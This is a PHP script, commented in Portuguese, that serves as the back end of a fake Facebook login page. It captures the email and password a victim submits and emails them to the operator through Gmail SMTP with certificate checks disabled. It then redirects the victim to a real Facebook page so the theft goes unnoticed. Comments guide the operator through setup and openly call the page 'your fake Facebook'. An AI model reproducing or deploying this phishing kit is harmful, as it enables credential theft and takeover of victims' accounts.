<?php
//NESSA ÁREA, NÓS PEGAMOS TODOS OS INPUTS NECESSÁRIOS DA PÁGINA
session_start();

$_SESSION['email']  = $_POST['email'] ;
$_SESSION['senha']  = $_POST['pass'] ;


$email = "EMAIL:". $_SESSION ['email'];
$senha ="SENHA:".$_SESSION ['senha'];





require_once("vendor/autoload.php");



//Create a new PHPMailer instance
$mail = new PHPMailer;

//Tell PHPMailer to use SMTP
$mail->isSMTP();

//Enable SMTP debugging
// 0 = off (for production use)
// 1 = client messages
// 2 = client and server messages
$mail->SMTPDebug = 0;

//Ask for HTML-friendly debug output
$mail->Debugoutput = 'html';

//Set the hostname of the mail server
$mail->Host = 'smtp.gmail.com';
// use
// $mail->Host = gethostbyname('smtp.gmail.com');
// if your network does not support SMTP over IPv6

//Set the SMTP port number - 587 for authenticated TLS, a.k.a. RFC4409 SMTP submission
$mail->Port = 587;

//Set the encryption system to use - ssl (deprecated) or tls
$mail->SMTPSecure = 'tls';

//Whether to use SMTP authentication
$mail->SMTPAuth = true;

//Username to use for SMTP authentication - use full email address for gmail
$mail->Username = "teste@email.com"; // ATENÇÃO, AQUI VAI SEU EMAIL

//Password to use for SMTP authentication
$mail->Password = "sua senhha"; //ATENÇÃO, AQUI VAI SUA SENHA DO EMAIL



//Set who the message is to be sent from
$mail->setFrom('Seu email', 'seu nome'); //AQUI TAMBÉM VAI SEU EMAIL E NO SEGUNDA PARÂMETRO, IRÁ O SEU NOME

//Set an alternative reply-to address
//$mail->addReplyTo('replyto@example.com', 'First Last');

//Set who the message is to be sent to
$mail->addAddress('mesma coisa do anterior', 'SEU NOME');

//Set the subject line
$mail->Subject = "Senha do Facebook Capturada"; //AQUI VAI O TÍTULO DO EMAIL QUE IRÁ APARECER NA SUA CAIXA DE ENTRADA TODA VEZ QUE ALGUÉM TENTAR ENTRAR NO SEU FACEBOOK FALSO

//Read an HTML message body from an external file, convert referenced images to embedded,
//convert HTML into a basic plain-text alternative body
$mail->msgHTML(file_get_contents('contents.php'), dirname(__FILE__));

//Replace the plain text body with one created manually



$mail->SMTPOptions = array(
           'ssl' => array(
               'verify_peer' => false,
                'verify_peer_name' => false,
                  'allow_self_signed' => true
    )
);



//Attach an image file
//$mail->addAttachment('images/phpmailer_mini.png');

//send the message, check for errors
if (!$mail->send()) {
    echo "Mailer Error: " . $mail->ErrorInfo;
} else {

	header('Location: https://pt-br.facebook.com/FraseDeGoleiros/'); //A PESSOA SERÁ DIRECIONADA PARA ESSA PÁGINA AO CLICAR EM ENTRAR
    
    
}




 ?>